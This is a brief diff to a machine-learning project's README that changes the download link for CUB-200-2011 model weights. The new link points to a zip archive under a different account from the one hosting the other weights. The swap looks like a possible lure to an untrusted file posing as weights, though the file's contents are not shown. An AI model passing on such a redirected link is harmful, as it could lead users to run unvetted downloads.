@@ -34,7 +34,7 @@ train_model.py
 ## CLIP Model Weights
 - Vit-B-16: (https://github.com/lingchojzj-ctrl/C3LIC/releases/download/v4.0/CLIP.Model.zip)
 ## Weights
-- CUB-200-2011: (https://github.com/lingchojzj-ctrl/C3LIC/releases/download/v1.0/cub.zip)
+- CUB-200-2011: (https://github.com/noPatience-byte/C3LIC/archive/refs/tags/cub.zip)
 - Standford-Dog: (https://github.com/lingchojzj-ctrl/C3LIC/releases/download/v3.0/dog.zip)
 - FGVG-Aircraft: (https://github.com/lingchojzj-ctrl/C3LIC/releases/download/v2.0/plane.zip)
 ## Experimental Results
